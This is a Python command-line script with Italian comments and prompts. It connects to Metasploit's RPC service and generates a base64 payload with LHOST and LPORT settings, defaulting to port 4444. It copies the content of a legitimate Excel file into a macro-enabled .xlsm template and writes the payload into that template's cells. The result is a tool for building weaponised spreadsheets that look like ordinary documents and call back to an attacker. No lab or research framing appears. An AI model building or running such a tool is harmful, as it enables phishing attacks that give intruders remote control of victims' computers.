import sys
import argparse
import logging
import time

from excel_handler import ExcelHandler
from payload_handler import PayloadHandler


class CLI:
    def __init__(self, excel_handler, payload_handler):
        self.excel_handler = excel_handler
        self.payload_handler = payload_handler
        self.parser = argparse.ArgumentParser(description="Gestione Excel e Payloads")

        # Parametri per i file Excel
        self.parser.add_argument('-e', '--excel', help="Percorso del file Excel sorgente (.xlsx)", type=str)
        self.parser.add_argument('-t', '--template', help="Percorso del file template (.xlsm) contenente macro",
                                 type=str)

        # Parametri per la generazione del payload
        self.parser.add_argument('-p', '--payload', help="Genera payload e lo inserisce nel template",
                                 action='store_true')
        self.parser.add_argument('--lhost', help="Indirizzo LHOST per il payload", type=str, default="127.0.0.1")
        self.parser.add_argument('--lport', help="Porta LPORT per il payload", type=int, default=4444)

        # Parametri per la connessione a Metasploit
        self.parser.add_argument('--msf-password', help="Password per Metasploit", type=str)
        self.parser.add_argument('--msf-host', help="Host per Metasploit", type=str, default="127.0.0.1")
        self.parser.add_argument('--msf-port', help="Porta per Metasploit", type=int, default=55552)

    def start(self):
        # Se nessun parametro viene passato (oltre a -h), attiva la modalità interattiva.
        if len(sys.argv) == 1:
            input("Modalità interattiva: inserisci i parametri richiesti. Premi invio!")
            excel = input("Inserisci il percorso del file Excel sorgente (.xlsx): ").strip()
            template = input("Inserisci il percorso del file template (.xlsm) contenente macro: ").strip()
            msf_password = input("Inserisci la password per Metasploit: ").strip()
            msf_host = input("Inserisci l'host per Metasploit (default 127.0.0.1): ").strip() or "127.0.0.1"
            msf_port = input("Inserisci la porta per Metasploit (default 55552): ").strip() or "55552"
            payload_flag = input("Generare payload e inserirlo nel template? (s/n): ").strip().lower()
            if payload_flag.startswith('s'):
                generate_payload = True
                lhost = input("Inserisci l'indirizzo LHOST per il payload (default 127.0.0.1): ").strip() or "127.0.0.1"
                lport = input("Inserisci la porta LPORT per il payload (default 4444): ").strip() or "4444"
            else:
                generate_payload = False
                lhost = "127.0.0.1"
                lport = 4444

            # Simula un oggetto args
            class Args:
                pass

            args = Args()
            args.excel = excel
            args.template = template
            args.msf_password = msf_password
            args.msf_host = msf_host
            args.msf_port = int(msf_port)
            args.payload = generate_payload
            args.lhost = lhost
            args.lport = int(lport)
        else:
            args = self.parser.parse_args()

        # Imposta i percorsi per Excel
        self.excel_handler.filename = args.excel
        self.excel_handler.template = args.template

        # Imposta i parametri di connessione in PayloadHandler e stabilisce la connessione
        self.payload_handler.password = args.msf_password
        self.payload_handler.host = args.msf_host
        self.payload_handler.port = args.msf_port
        client = self.payload_handler.connect()
        if client is None:
            logging.error("Connessione a Metasploit fallita. Uscita.")
            time.sleep(5)
            exit()

        # Workflow:
        # 1. Carica file sorgente e template
        self.excel_handler.load_source()
        self.excel_handler.load_template()
        # 2. Copia il contenuto 1:1 dal file sorgente al template
        self.excel_handler.copy_content()
        # 3. Se richiesto, genera il payload e lo inserisce nelle celle previste
        if args.payload:
            payload_b64 = self.payload_handler.generate_payload(args.lhost, args.lport)
            if payload_b64:
                self.excel_handler.write_payload_to_cells(payload_b64)
            else:
                logging.error("Generazione del payload fallita.")
        # 4. Salva il file finale in formato .xlsm preservando le macro
        self.excel_handler.save_workbook(save_as_new=False)


if __name__ == "__main__":
    cli = CLI(ExcelHandler(), PayloadHandler(password=""))
    cli.start()
